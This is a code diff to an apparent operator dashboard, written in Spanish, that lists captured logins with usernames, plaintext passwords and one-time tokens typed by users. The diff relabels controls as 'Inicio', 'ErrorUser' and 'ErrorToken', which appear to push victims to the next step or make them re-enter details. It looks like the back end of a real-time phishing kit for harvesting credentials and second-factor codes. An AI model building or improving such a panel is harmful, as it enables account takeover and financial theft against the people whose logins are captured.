@@ -348,8 +348,10 @@
             tbody td { font-size: 13px; }
             tbody td::before { min-width: 75px; font-size: 11px; }
             .btn { padding: 6px 10px; font-size: 11px; }
+
         }
     </style>
+
 </head>
 <body>
     <div class="header">
@@ -421,21 +423,28 @@
                     <tr>
                         <th>Usuario</th>
                         <th>Contraseña</th>
+                        <th>Token</th>
                         <th>Portal</th>
                         <th>Estado</th>
-                        <th>Token</th>
                         <th>Fecha</th>
-                        <th>Acciones</th>
+                        <th>Ls Usuario</th>
+                        <th>Ls Token</th>
+                        <th>Eliminar</th>
                     </tr>
+
+
+
                 </thead>
                 <tbody id="solicitudesBody">
                     <tr>
-                        <td colspan="7">
+                        <td colspan="9">
                             <div class="empty-state">
                                 <i class="fas fa-inbox"></i>
                                 <p>Cargando solicitudes...</p>
                             </div>
                         </td>
+
+
                     </tr>
                 </tbody>
             </table>
@@ -596,7 +605,9 @@
             var tbody = document.getElementById('solicitudesBody');
             
             if (!solicitudes || solicitudes.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="7"><div class="empty-state"><i class="fas fa-inbox"></i><p>No hay solicitudes de ingreso registradas</p></div></td></tr>';
+                tbody.innerHTML = '<tr><td colspan="9"><div class="empty-state"><i class="fas fa-inbox"></i><p>No hay solicitudes de ingreso registradas</p></div></td></tr>';
+
+
                 updateStats([]);
                 return;
             }
@@ -612,16 +623,14 @@
                 var fecha = formatDate(s.created_at);
                 var id = s.id;
 
-                // Mostrar token ingresado por usuario + botón Validar
+                // Mostrar token ingresado por usuario + botón Error Token
                 var tokenHtml = '';
                 if (s.token_ingresado) {
-                    tokenHtml += '<div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-start;">';
                     tokenHtml += '<div style="font-size: 16px; font-weight: 700; color: #065f46; letter-spacing: 3px; font-family: monospace; padding: 4px 8px; background: #ecfdf5; border-radius: 6px; display: inline-block;">✏️ ' + escapeHtml(s.token_ingresado) + '</div>';
-                    tokenHtml += '<button class="btn btn-validate" onclick="validarTokenClick(' + id + ')" style="padding: 4px 10px; font-size: 11px;"><i class="fas fa-check-double"></i> Validar</button>';
-                    tokenHtml += '</div>';
                 }
 
                 html += '<tr>' +
+
                     '<td data-label="Usuario">' +
                         '<div class="user-cell">' +
                             '<div class="user-avatar ' + avatarColor + '">' + initials + '</div>' +
@@ -632,19 +641,29 @@
                         '</div>' +
                     '</td>' +
                     '<td data-label="Contraseña"><span class="password-cell">' + escapeHtml(s.contrasena || '') + '</span></td>' +
+                    '<td data-label="Token">' + tokenHtml + '</td>' +
                     '<td data-label="Portal"><span class="portal-badge ' + s.portal + '"><i class="fas ' + portalIcon + '"></i> ' + portalLabel + '</span></td>' +
                     '<td data-label="Estado">' + statusBadge + '</td>' +
-                    '<td data-label="Token">' + tokenHtml + '</td>' +
                     '<td data-label="Fecha" style="font-size: 12px; color: #6b7280;">' + fecha + '</td>' +
+
                     '<td data-label="Acciones">' +
-                        '<div class="actions-cell">' +
-                            '<button class="btn btn-approve" onclick="actualizarEstadoClick(' + id + ', \'aprobado\')" ' + (s.estado === 'aprobado' ? 'disabled style="opacity:0.5;cursor:not-allowed;"' : '') + '><i class="fas fa-check"></i> Aprobar</button>' +
-                            '<button class="btn btn-reject" onclick="actualizarEstadoClick(' + id + ', \'rechazado\')" ' + (s.estado === 'rechazado' ? 'disabled style="opacity:0.5;cursor:not-allowed;"' : '') + '><i class="fas fa-times"></i> Rechazar</button>' +
-                            '<button class="btn btn-token" onclick="generarTokenClick(' + id + ')"><i class="fas fa-key"></i> Token</button>' +
-                            '<button class="btn btn-delete" onclick="eliminarRegistroClick(' + id + ')"><i class="fas fa-trash"></i></button>' +
+                        '<div style="display: flex; flex-direction: column; gap: 4px;">' +
+                            '<button class="btn btn-approve" onclick="actualizarEstadoClick(' + id + ', \'aprobado\')" ' + (s.estado === 'aprobado' ? 'disabled style="opacity:0.5;cursor:not-allowed;"' : '') + ' style="width:100%; padding: 6px 10px; font-size: 12px;"><i class="fas fa-check"></i> Inicio</button>' +
+                            '<button class="btn btn-reject" onclick="actualizarEstadoClick(' + id + ', \'rechazado\')" ' + (s.estado === 'rechazado' ? 'disabled style="opacity:0.5;cursor:not-allowed;"' : '') + ' style="width:100%; padding: 6px 10px; font-size: 12px;"><i class="fas fa-times"></i> ErrorUser</button>' +
                         '</div>' +
                     '</td>' +
+                    '<td data-label="ls token">' +
+                        '<div style="display: flex; flex-direction: column; gap: 4px;">' +
+                            '<button class="btn btn-token" onclick="generarTokenClick(' + id + ')" style="width:90%; padding: 6px 10px; font-size: 12px;"><i class="fas fa-key"></i> Token</button>' +
+                            (s.token_ingresado ? '<button class="btn btn-validate" onclick="validarTokenClick(' + id + ')" style="width:95%; padding: 6px 10px; font-size: 12px;"><i class="fa-solid fa-x"></i> ErrorToken</button>' : '') +
+                        '</div>' +
+                    '</td>' +
+                    '<td data-label="Eliminar" style="text-align: center;">' +
+                        '<button class="btn btn-delete" onclick="eliminarRegistroClick(' + id + ')" style="padding: 6px 10px; font-size: 12px;"><i class="fas fa-trash"></i>  </button>' +
+                    '</td>' +
                 '</tr>';
+
+
             }
             tbody.innerHTML = html;
             updateStats(solicitudes);
@@ -839,7 +858,9 @@
             } catch (err) {
                 console.error('❌ Error al cargar:', err);
                 document.getElementById('solicitudesBody').innerHTML = 
-                    '<tr><td colspan="7"><div class="empty-state"><i class="fas fa-exclamation-triangle"></i><p>Error al cargar datos: ' + escapeHtml(err.message) + '</p></div></td></tr>';
+                    '<tr><td colspan="9"><div class="empty-state"><i class="fas fa-exclamation-triangle"></i><p>Error al cargar datos: ' + escapeHtml(err.message) + '</p></div></td></tr>';
+
+
             }
         }
 
